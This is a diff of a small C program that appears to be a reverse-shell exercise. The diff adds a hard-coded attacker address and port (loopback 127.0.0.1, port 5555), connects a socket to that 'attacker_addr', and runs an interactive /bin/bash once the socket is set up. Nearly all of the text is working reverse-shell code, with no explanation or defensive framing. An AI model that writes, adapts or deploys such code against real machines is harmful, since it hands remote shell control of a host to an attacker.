@@ -2,6 +2,11 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
+#include <arpa/inet.h>
+
+
+#define REV_ADDR "127.0.0.1"
+#define REV_PORT 5555
 
 //TODO
 //create the socket
@@ -12,8 +17,8 @@ int main(){
 
     struct sockaddr_in attacker_addr;
     attacker_addr.sin_family = AF_INET;
-    attacker_addr.sin_port = htons(5555);
-    attacker_addr.sin_addr.s_addr = INADDR_ANY;
+    attacker_addr.sin_port = htons(REV_PORT);
+    inet_aton(REV_ADDR,&attacker_addr.sin_addr.s_addr);
 
 
     int sockfd = socket(AF_INET,SOCK_STREAM,0);
@@ -34,7 +39,6 @@ int main(){
 	}
 
 
-//    execl("/bin/sh","sh",NULL);
     execve("/bin/bash",(char *[]){"/bin/bash","-i",NULL},NULL);
 
 
